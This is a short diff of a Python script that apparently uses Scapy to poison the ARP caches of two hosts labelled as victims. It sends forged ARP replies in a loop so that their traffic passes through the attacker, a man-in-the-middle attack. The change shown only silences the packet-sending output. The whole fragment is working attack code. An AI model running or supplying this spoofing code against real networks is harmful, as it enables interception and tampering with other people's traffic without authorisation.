@@ -26,9 +26,9 @@ victim2_MAC = MAC_on_network[2]
 nb_packets = 0
 while nb_packets < 100:
     spoof_arp_victim1 = ARP(op=2, psrc=victim2_IP, hwdst=victim1_MAC, pdst=victim1_IP)
-    send_spoof1 = sendp(spoof_arp_victim1)
+    send_spoof1 = sendp(spoof_arp_victim1, verbose = False)
     spoof_arp_victim2 = ARP(op=2, psrc=victim1_IP, hwdst=victim2_MAC, pdst=victim2_IP)
-    send_spoof2 = sendp(spoof_arp_victim2)
+    send_spoof2 = sendp(spoof_arp_victim2, verbose = False)
     nb_packets += 2
 
 print(nb_packets)
